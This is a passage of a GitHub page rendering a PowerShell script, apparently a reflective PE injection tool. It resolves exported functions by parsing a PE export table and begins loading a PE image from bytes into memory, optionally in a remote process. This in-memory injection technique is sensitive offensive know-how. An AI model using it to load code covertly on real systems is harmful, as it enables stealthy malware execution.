        </tr>
        <tr>
          <td id="L2292" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2292"></td>
          <td id="LC2292" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2293" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2293"></td>
          <td id="LC2293" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2294" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2294"></td>
          <td id="LC2294" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2295" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2295"></td>
          <td id="LC2295" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2296" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2296"></td>
          <td id="LC2296" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>####################################</span></td>
        </tr>
        <tr>
          <td id="L2297" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2297"></td>
          <td id="LC2297" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>#########    FUNCTIONS   ###########</span></td>
        </tr>
        <tr>
          <td id="L2298" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2298"></td>
          <td id="LC2298" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>####################################</span></td>
        </tr>
        <tr>
          <td id="L2299" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2299"></td>
          <td id="LC2299" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-MemoryProcAddress</span></td>
        </tr>
        <tr>
          <td id="L2300" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2300"></td>
          <td id="LC2300" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2301" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2301"></td>
          <td id="LC2301" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L2302" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2302"></td>
          <td id="LC2302" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2303" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2303"></td>
          <td id="LC2303" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L2304" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2304"></td>
          <td id="LC2304" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2305" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2305"></td>
          <td id="LC2305" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2306" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2306"></td>
          <td id="LC2306" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2307" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2307"></td>
          <td id="LC2307" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L2308" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2308"></td>
          <td id="LC2308" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FunctionName</span></td>
        </tr>
        <tr>
          <td id="L2309" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2309"></td>
          <td id="LC2309" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L2310" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2310"></td>
          <td id="LC2310" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2311" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2311"></td>
          <td id="LC2311" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2312" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2312"></td>
          <td id="LC2312" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2313" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2313"></td>
          <td id="LC2313" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-PEDetailedInfo</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2314" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2314"></td>
          <td id="LC2314" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2315" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2315"></td>
          <td id="LC2315" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get the export table</span></td>
        </tr>
        <tr>
          <td id="L2316" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2316"></td>
          <td id="LC2316" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2317" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2317"></td>
          <td id="LC2317" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2318" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2318"></td>
          <td id="LC2318" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">return</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L2319" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2319"></td>
          <td id="LC2319" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2320" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2320"></td>
          <td id="LC2320" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExportTablePtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress</span></span>)</td>
        </tr>
        <tr>
          <td id="L2321" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2321"></td>
          <td id="LC2321" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExportTable</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ExportTablePtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_EXPORT_DIRECTORY</span></span>)</td>
        </tr>
        <tr>
          <td id="L2322" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2322"></td>
          <td id="LC2322" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2323" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2323"></td>
          <td id="LC2323" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span> (<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$ExportTable<span class="pl-smi">.NumberOfNames</span></span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L2324" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2324"></td>
          <td id="LC2324" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2325" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2325"></td>
          <td id="LC2325" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>AddressOfNames is an array of pointers to strings of the names of the functions exported</span></td>
        </tr>
        <tr>
          <td id="L2326" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2326"></td>
          <td id="LC2326" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NameOffsetPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) (<span class="pl-smi">$ExportTable<span class="pl-smi">.AddressOfNames</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$i</span> <span class="pl-k">*</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">UInt32</span>])))</td>
        </tr>
        <tr>
          <td id="L2327" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2327"></td>
          <td id="LC2327" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NamePtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$NameOffsetPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">UInt32</span>]))</td>
        </tr>
        <tr>
          <td id="L2328" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2328"></td>
          <td id="LC2328" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Name</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$NamePtr</span>)</td>
        </tr>
        <tr>
          <td id="L2329" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2329"></td>
          <td id="LC2329" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2330" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2330"></td>
          <td id="LC2330" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Name</span> <span class="pl-k">-ceq</span> <span class="pl-smi">$FunctionName</span>)</td>
        </tr>
        <tr>
          <td id="L2331" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2331"></td>
          <td id="LC2331" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2332" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2332"></td>
          <td id="LC2332" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions</span></td>
        </tr>
        <tr>
          <td id="L2333" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2333"></td>
          <td id="LC2333" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>    which contains the offset of the function in to the DLL</span></td>
        </tr>
        <tr>
          <td id="L2334" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2334"></td>
          <td id="LC2334" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$OrdinalPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) (<span class="pl-smi">$ExportTable<span class="pl-smi">.AddressOfNameOrdinals</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$i</span> <span class="pl-k">*</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">UInt16</span>])))</td>
        </tr>
        <tr>
          <td id="L2335" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2335"></td>
          <td id="LC2335" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$FuncIndex</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$OrdinalPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L2336" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2336"></td>
          <td id="LC2336" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$FuncOffsetAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) (<span class="pl-smi">$ExportTable<span class="pl-smi">.AddressOfFunctions</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$FuncIndex</span> <span class="pl-k">*</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">UInt32</span>])))</td>
        </tr>
        <tr>
          <td id="L2337" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2337"></td>
          <td id="LC2337" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$FuncOffset</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$FuncOffsetAddr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">UInt32</span>])</td>
        </tr>
        <tr>
          <td id="L2338" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2338"></td>
          <td id="LC2338" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">return</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) (<span class="pl-smi">$FuncOffset</span>)</td>
        </tr>
        <tr>
          <td id="L2339" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2339"></td>
          <td id="LC2339" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2340" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2340"></td>
          <td id="LC2340" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2341" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2341"></td>
          <td id="LC2341" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2342" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2342"></td>
          <td id="LC2342" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L2343" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2343"></td>
          <td id="LC2343" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2344" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2344"></td>
          <td id="LC2344" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2345" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2345"></td>
          <td id="LC2345" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2346" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2346"></td>
          <td id="LC2346" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Invoke-MemoryLoadLibrary</span></td>
        </tr>
        <tr>
          <td id="L2347" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2347"></td>
          <td id="LC2347" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2348" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2348"></td>
          <td id="LC2348" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L2349" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2349"></td>
          <td id="LC2349" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span> )]</td>
        </tr>
        <tr>
          <td id="L2350" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2350"></td>
          <td id="LC2350" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L2351" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2351"></td>
          <td id="LC2351" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2352" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2352"></td>
          <td id="LC2352" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2353" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2353"></td>
          <td id="LC2353" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)]</td>
        </tr>
        <tr>
          <td id="L2354" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2354"></td>
          <td id="LC2354" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L2355" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2355"></td>
          <td id="LC2355" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExeArgs</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2356" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2356"></td>
          <td id="LC2356" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2357" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2357"></td>
          <td id="LC2357" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)]</td>
        </tr>
        <tr>
          <td id="L2358" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2358"></td>
          <td id="LC2358" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L2359" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2359"></td>
          <td id="LC2359" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2360" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2360"></td>
          <td id="LC2360" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2361" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2361"></td>
          <td id="LC2361" class="blob-code blob-code-inner js-file-line">        [<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span>)]</td>
        </tr>
        <tr>
          <td id="L2362" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2362"></td>
          <td id="LC2362" class="blob-code blob-code-inner js-file-line">        [<span class="pl-k">Bool</span>]</td>
        </tr>
        <tr>
          <td id="L2363" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2363"></td>
          <td id="LC2363" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ForceASLR</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2364" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2364"></td>
          <td id="LC2364" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L2365" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2365"></td>
          <td id="LC2365" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2366" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2366"></td>
          <td id="LC2366" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PtrSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2367" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2367"></td>
          <td id="LC2367" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2368" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2368"></td>
          <td id="LC2368" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get Win32 constants and functions</span></td>
        </tr>
        <tr>
          <td id="L2369" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2369"></td>
          <td id="LC2369" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2370" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2370"></td>
          <td id="LC2370" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L2371" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2371"></td>
          <td id="LC2371" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2372" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2372"></td>
          <td id="LC2372" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2373" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2373"></td>
          <td id="LC2373" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2374" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2374"></td>
          <td id="LC2374" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-ne</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L2375" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2375"></td>
          <td id="LC2375" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2376" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2376"></td>
          <td id="LC2376" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L2377" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2377"></td>
          <td id="LC2377" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2378" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2378"></td>
          <td id="LC2378" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2379" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2379"></td>
          <td id="LC2379" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get basic PE information</span></td>
        </tr>
        <tr>
          <td id="L2380" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2380"></td>
          <td id="LC2380" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Getting basic PE information from the file<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2381" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2381"></td>
          <td id="LC2381" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-PEBasicInfo</span> <span class="pl-k">-</span>PEBytes <span class="pl-smi">$PEBytes</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2382" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2382"></td>
          <td id="LC2382" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$OriginalImageBase</span> <span class="pl-k">=</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.OriginalImageBase</span></span></td>
        </tr>
        <tr>
          <td id="L2383" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2383"></td>
          <td id="LC2383" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NXCompatible</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L2384" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2384"></td>
          <td id="LC2384" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$PEInfo<span class="pl-smi">.DllCharacteristics</span></span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span>) <span class="pl-k">-ne</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span>)</td>
        </tr>
        <tr>
          <td id="L2385" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2385"></td>
          <td id="LC2385" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2386" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2386"></td>
          <td id="LC2386" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE is not compatible with DEP, might cause issues<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2387" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2387"></td>
          <td id="LC2387" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NXCompatible</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2388" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2388"></td>
          <td id="LC2388" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2389" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2389"></td>
          <td id="LC2389" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2390" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2390"></td>
          <td id="LC2390" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2391" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2391"></td>
          <td id="LC2391" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Verify that the PE and the current process are the same bits (32bit or 64bit)</span></td>
        </tr>
        <tr>
          <td id="L2392" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2392"></td>
          <td id="LC2392" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Process64Bit</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
